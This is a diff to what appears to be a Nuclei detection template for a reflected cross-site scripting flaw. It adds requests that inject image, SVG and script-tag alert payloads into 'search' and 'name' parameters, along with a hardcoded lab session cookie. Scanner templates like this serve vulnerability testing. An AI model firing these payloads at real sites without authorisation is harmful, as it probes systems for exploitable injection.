@@ -9,7 +9,7 @@ info:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
     cvss-score: 9.6
     cve-id: CVE-2023-1234
-  tags: xss,reflected,web,security,portswigger
+  tags: xss,reflected,web,security
 
 variables:
   random_number: "{{rand_int(1000,9999)}}"
@@ -24,14 +24,32 @@ http:
       - |
         GET /?search=<img+src=x+onerror=alert({{random_number}})> HTTP/1.1
         Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
 
       - |
         GET /?search=<svg+onload=alert({{random_number}})> HTTP/1.1
         Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
 
       - |
-        GET /?search="'><script>alert({{random_number}})</script> HTTP/1.1
+        GET /?search="'><script>alert({{random_number}})</script> HTTP/2
         Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+      - |
+        GET /?name="'><script>alert({{random_number}})</script> HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+      - |
+        GET /?name=<script>alert({{random_number}})</script> HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    headers:
+        User-Agent: "Mozilla/5.0"
+        Accept: "text/html,application/xhtml+xml"
+        Cookie: "PHPSESSID=19upvbuk15g4om4j268lo0ckep; security=low"
 
     matchers:
       - type: word
